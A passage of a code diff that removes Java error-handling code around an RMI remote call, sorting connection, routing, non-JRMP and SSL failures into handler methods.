-            } catch(java.io.IOException e) {
-                throw new java.rmi.MarshalException("error marshalling arguments", e);
-            }
-
-            remoteRef.invoke(call);
-            remoteRef.done(call);
-
-        } catch(java.rmi.ConnectException e) {
-
-            Throwable t = RMGUtils.getCause(e);
-
-            if( t instanceof java.net.ConnectException && t.getMessage().contains("Connection refused")) {
-                ExceptionHandler.connectionRefused(e, callName, "call");
-
-            } else {
-                ExceptionHandler.unexpectedException(e, callName, "call", true);
-            }
-
-        } catch(java.rmi.ConnectIOException e) {
-
-            Throwable t = RMGUtils.getCause(e);
-
-            if( t instanceof java.net.NoRouteToHostException) {
-                ExceptionHandler.noRouteToHost(e, callName, "call");
-
-            } else if( t instanceof java.rmi.ConnectIOException && t.getMessage().contains("non-JRMP server")) {
-                ExceptionHandler.noJRMPServer(e, callName, "call");
-
-            } else if( t instanceof javax.net.ssl.SSLException && t.getMessage().contains("Unsupported or unrecognized SSL message")) {
-                ExceptionHandler.sslError(e, callName, "call");
-
-            } else {
-                ExceptionHandler.unexpectedException(e, callName, "call", true);
-            }
-        }
     }
 }
